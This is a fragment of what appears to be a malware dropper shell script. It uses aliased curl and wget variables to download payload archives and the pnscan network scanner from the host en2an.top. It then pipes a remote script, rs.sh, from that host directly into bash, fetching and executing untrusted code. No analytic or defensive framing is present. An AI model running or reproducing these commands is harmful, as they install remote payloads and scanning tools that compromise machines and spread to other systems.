...
rm -rf x1.tar.gz
sleep 1
$bbdira -sL -o x1.tar.gz http://en2an.top/b2f628fff19fda999999999/1.0.4.tar.gz
sleep 1
...
$bbdira -sL -o .x112 http://en2an.top/cleanfda/pnscan.tar.gz || $ccdira -q -O .x112 http://en2an.top/cleanfda/pnscan.tar.gz
sleep 1
...
$bbdir -fsSL http://en2an.top/cleanfda/rs.sh | bash
$bbdira -fsSL http://en2an.top/cleanfda/rs.sh | bash
